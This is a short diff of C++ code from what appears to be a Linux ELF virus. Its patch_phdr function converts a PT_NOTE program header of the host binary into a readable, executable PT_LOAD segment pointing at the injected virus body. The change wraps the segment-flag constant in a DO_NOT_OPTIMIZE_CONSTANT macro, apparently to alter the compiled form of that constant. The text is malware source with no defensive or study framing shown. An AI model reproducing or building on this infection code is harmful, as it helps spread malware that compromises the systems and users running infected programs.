@@ -48,7 +48,7 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
   pt_note_to_be_infected->p_memsz = virus_size;
   pt_note_to_be_infected->p_offset = virus_offset;
   pt_note_to_be_infected->p_type = PT_LOAD;
-  pt_note_to_be_infected->p_flags = PF_R | PF_X;
+  pt_note_to_be_infected->p_flags = DO_NOT_OPTIMIZE_CONSTANT(PF_R | PF_X);
 }
 
 }  // namespace
